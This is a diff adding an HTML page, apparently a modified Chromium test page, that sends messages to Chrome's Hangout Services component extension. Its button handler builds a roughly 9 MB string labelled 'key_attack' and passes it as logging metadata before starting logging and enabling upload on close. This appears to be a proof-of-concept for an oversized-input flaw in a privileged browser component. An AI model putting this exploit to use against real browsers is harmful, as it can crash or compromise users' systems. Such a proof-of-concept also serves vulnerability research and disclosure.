@@ -1,0 +1,119 @@
+<html>
+<head>
+<script>
+// ID of the Hangout Services component extension.
+var EXTENSION_ID = "nkeimhogjdpnpccoofpliimaahmaaome";
+
+// Sends a message to the Hangout Services extension, expecting
+// success, and unwraps the value returned.
+function sendMessage(message, callback) {
+  function unwrapValue(result) {
+  	console.info(result);
+    if (result && callback){
+    	callback(result.value);
+  	}
+  }
+  window.top.chrome.runtime.sendMessage(EXTENSION_ID, message, unwrapValue);
+}
+
+// If connected, this port will receive events from the extension.
+var callbackPort;
+
+// Will call |callback(cpuInfo)| on completion.
+function cpuGetInfo(callback) {
+  sendMessage({'method': 'cpu.getInfo'}, callback);
+}
+
+function testCpuGetInfo(callback) {
+  cpuGetInfo(function(info) {
+      if (info.numOfProcessors != 0 &&
+          info.archName != '' &&
+          info.modelName != '')
+        callback('');
+      else
+        callback('Missing information in CpuInfo');
+    });
+}
+
+// Will call |callback()| on completion.
+function loggingSetMetadata(metaData, callback) {
+  sendMessage({'method': 'logging.setMetadata', 'metaData': metaData},
+              callback);
+}
+
+// Will call |callback()| on completion.
+function loggingStart(callback) {
+  sendMessage({'method': 'logging.start'}, callback);
+}
+
+// Will call |callback()| when API method has been called (it will
+// complete later).
+function loggingUploadOnRenderClose() {
+  sendMessage({'method': 'logging.uploadOnRenderClose'});
+}
+
+// Will call |callback()| when API method has been called (it will
+// complete later).
+function loggingNoUploadOnRenderClose() {
+  sendMessage({'method': 'logging.noUploadOnRenderClose'});
+}
+
+// Will call |callback()| on completion.
+function loggingStop(callback) {
+  sendMessage({'method': 'logging.stop'}, callback);
+}
+
+function repeatStr(val,len){
+  var ret="";
+  for (var i=0;i<len;i++){
+    ret=ret.concat(val);
+  }
+  //console.info(ret);
+  return ret;
+}
+function generateData(){
+  var len = 6*1024*1024+3*1024*1024;
+  var attack=repeatStr("A",len);
+  console.info(attack.length);
+  var ret=[{'key':"key_attack", "value":attack}];
+  return ret;
+}
+function testLogging(callback) {
+  var hugeData = generateData();
+  //console.info(hugeData);
+  loggingSetMetadata(hugeData, function() {
+      loggingStart(function() {
+          loggingUploadOnRenderClose();
+          loggingStop(function() {
+              callback('');
+            });
+        });
+    });
+}
+
+// Starts and stops logging while auto-upload is disabled.
+function testDisabledLogging(callback) {
+  //loggingNoUploadOnRenderClose();
+  loggingStart(function() {
+      loggingStop(function() {
+          callback('');
+        });
+    });
+}
+
+function showRet(msg){
+	console.info(msg);
+}
+function onClicked(){
+	alert("hi");
+	console.info("I was clicked");
+	//testCpuGetInfo(showRet);
+	testLogging(showRet);
+}
+</script>
+</head>
+<body>
+	<h1>Webrtc test</h1>
+	<button onclick="onClicked();">click Me</button>
+</body>
+</html>
